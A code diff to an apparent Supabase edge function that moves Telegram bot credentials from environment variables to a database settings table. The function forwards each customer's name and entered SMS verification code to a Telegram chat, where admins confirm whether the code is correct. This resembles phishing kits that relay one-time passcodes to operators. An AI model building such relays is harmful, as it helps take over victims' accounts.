@@ -6,6 +6,12 @@ const corsHeaders = {
   'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
 };
 
+interface TelegramSettings {
+  bot_token: string;
+  info_chat_id: string;
+  form_chat_id: string;
+}
+
 serve(async (req) => {
   if (req.method === 'OPTIONS') {
     return new Response(null, { headers: corsHeaders });
@@ -30,6 +36,27 @@ serve(async (req) => {
         }
       );
     }
+
+    // Get telegram settings from database
+    const { data: settings } = await supabase
+      .from('settings')
+      .select('value')
+      .eq('key', 'telegram')
+      .single();
+
+    if (!settings) {
+      console.error('No telegram settings found');
+      return new Response(
+        JSON.stringify({ success: false, message: 'Telegram not configured' }),
+        { 
+          status: 500, 
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
+        }
+      );
+    }
+
+    const telegramSettings = settings.value as TelegramSettings;
+    console.log('Using bot token:', telegramSettings.bot_token ? 'Found' : 'Missing');
 
     // Generate verification ID
     const verificationId = `verify_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
@@ -61,20 +88,6 @@ serve(async (req) => {
     }
 
     // Send message to Telegram with admin buttons
-    const telegramBotToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
-    const telegramChatId = Deno.env.get('TELEGRAM_CHAT_ID');
-
-    if (!telegramBotToken || !telegramChatId) {
-      console.error('Missing Telegram configuration');
-      return new Response(
-        JSON.stringify({ success: false, message: 'Telegram not configured' }),
-        { 
-          status: 500, 
-          headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
-        }
-      );
-    }
-
     const message = `🔐 *SMS Verification Request*
     
 👤 *Customer:* ${customerInfo.fullName}
@@ -96,13 +109,13 @@ Please verify if this code is correct:`;
       ]
     };
 
-    const telegramResponse = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+    const telegramResponse = await fetch(`https://api.telegram.org/bot${telegramSettings.bot_token}/sendMessage`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
-        chat_id: telegramChatId,
+        chat_id: telegramSettings.info_chat_id,
         text: message,
         parse_mode: 'Markdown',
         reply_markup: keyboard
